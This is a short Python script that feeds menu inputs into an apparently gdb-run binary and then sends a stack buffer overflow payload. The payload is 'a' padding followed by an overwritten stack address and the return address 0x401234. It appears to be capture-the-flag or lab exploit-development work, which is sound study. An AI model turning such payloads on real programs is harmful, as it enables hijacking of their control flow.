import sys
import time


time.sleep(2)
print("run")
sys.stdout.flush()
print(1)
sys.stdout.flush()
print(1)
sys.stdout.flush()
print(4)
sys.stdout.flush()
print("abcd")
sys.stdout.flush()
time.sleep(3)
# print(2)
# print(1)
# sys.stdout.flush()
# time.sleep(5)
print(1)
sys.stdout.flush()
print(1)
sys.stdout.flush()
print(-25)
sys.stdout.flush()
# time.sleep(5)
payload = "a" * (0x200-0x34)
payload = payload.encode()
# payload += b"\x01\x00\x00\x00\x00\x00\x00\x00"
# 0x7fffffffd7c0
payload += b"\xc0\xd7\xff\xff\xff\x7f\x00\x00"
payload += b"\x34\x12\x40\x00\x00\x00\x00\x00"
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x00\x00\x00\x00\x00\x00\x00\x00"
payload += b"\x0a"
# print
sys.stdout.buffer.write(payload)
sys.stdout.flush()
time.sleep(5)
print(4)
sys.stdout.flush()
time.sleep(5)
print("bt")
sys.stdout.flush()
# let the real stdin take over
while True:
    try:
        print(input())
    except EOFError:
        break
    except KeyboardInterrupt:
        break
    except:
        pass
